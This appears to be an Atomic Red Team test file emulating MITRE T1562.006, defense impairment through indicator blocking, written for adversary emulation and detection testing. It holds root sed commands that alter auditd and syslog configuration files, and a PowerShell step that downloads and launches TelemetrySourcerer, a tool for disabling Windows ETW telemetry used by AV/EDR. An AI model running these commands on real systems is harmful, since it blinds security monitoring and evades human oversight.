attack_technique: T1562.006
display_name: 'Impair Defenses: Indicator Blocking'
atomic_tests:
- name: 'Auditing Configuration Changes on Linux Host'
  auto_generated_guid: 212cfbcf-4770-4980-bc21-303e37abd0e3
  description: |
    Emulates modification of auditd configuration files
  supported_platforms:
  - linux
  input_arguments:
    audisp_config_file_name:
      description: The name of the audispd configuration file to be changed
      type: String
      default: audispd.conf
    auditd_config_file_name:
      description: The name of the auditd configuration file to be changed
      type: String
      default: auditd.conf
    libaudit_config_file_name:
      description: The name of the libaudit configuration file to be changed
      type: String
      default: libaudit.conf
  executor:
    command: |
      sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
      if [ -f "/etc/#{auditd_config_file_name}" ];
      then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}
      else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}
      fi 
      sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}
    cleanup_command: |
      sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
      if [ -f "/etc/#{auditd_config_file_name}" ];
      then sed -i '$ d' /etc/#{auditd_config_file_name}
      else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
      fi
      sed -i '$ d' /etc/#{libaudit_config_file_name}
    name: bash
    elevation_required: true
- name: 'Logging Configuration Changes on Linux Host'
  auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
  description: |
    Emulates modification of syslog configuration.
  supported_platforms:
  - linux
  input_arguments:
    syslog_config_file_name:
      description: The name of the syslog configuration file to be changed
      type: String
      default: syslog.conf
    rsyslog_config_file_name:
      description: The name of the rsyslog configuration file to be changed
      type: String
      default: rsyslog.conf
    syslog_ng_config_file_name:
      description: The name of the syslog-ng configuration file to be changed
      type: String
      default: syslog-ng.conf
  executor:
    command: |
      if [ -f "/etc/#{syslog_config_file_name}" ];
      then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
      fi
      if [ -f "/etc/#{rsyslog_config_file_name}" ];
      then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
      fi
      if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
      then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
      fi
    cleanup_command: |
      if [ -f "/etc/#{syslog_config_file_name}" ];
      then sed -i '$ d' /etc/#{syslog_config_file_name}
      fi
      if [ -f "/etc/#{rsyslog_config_file_name}" ];
      then sed -i '$ d' /etc/#{rsyslog_config_file_name}
      fi
      if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
      then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
      fi
    name: bash
    elevation_required: true
- name: 'Telemetry Sourcerer Tool - Windows'
  description: |
    This test was created to launch Telemetry Sourcerer v.0.10.0. This tool is capable of enumerating and disabling commons sources of telemetry used by AV/EDR on Windows. This allows attackers/red-teamers to identify blind spots, determine particular events created, and validate whether the tool's tampering abilities can lead to detection. Upon completion, the tool will open and you will have access to disabling ETW providers and sessions. A popup box will appear explaining that user-mode hooks and kernel-mode callbacks are not enabled. This test does not enable user-mode hooks or kernel-mode callbacks.
  supported_platforms:
  - windows
  input_arguments:
    TelemetrySourcererExe:
        description: Location of telemetrysourcerer.exe file.
        type: string
        default: $env:temp\TelemetrySourcerer\TelemetrySourcerer-v0.10.0\TelemetrySourcerer.exe
  dependency_executor_name: powershell
  dependencies:
  - description: 'Telemetry Sourcerer-v0.10.0 must be installed on the machine '
    prereq_command: |
        if (Test-Path #{TelemetrySourcererExe}) {exit 0} else {exit 1}
    get_prereq_command: |-
      Start-BitsTransfer -Source "https://github.com/jthuraisamy/TelemetrySourcerer/releases/download/v0.10.0/TelemetrySourcerer-v0.10.0.zip" -Destination "$env:temp\TelemetrySourcerer.zip" -dynamic
      expand-archive -LiteralPath "$env:temp\TelemetrySourcerer.zip" -DestinationPath "$env:temp\TelemetrySourcerer"
  executor:
    command: Start-Process -FilePath "$env:temp\TelemetrySourcerer\TelemetrySourcerer-v0.10.0\TelemetrySourcerer.exe"
    cleanup_command: Stop-Process -Name "TelemetrySourcerer"
    name: powershell
    elevation_required: false
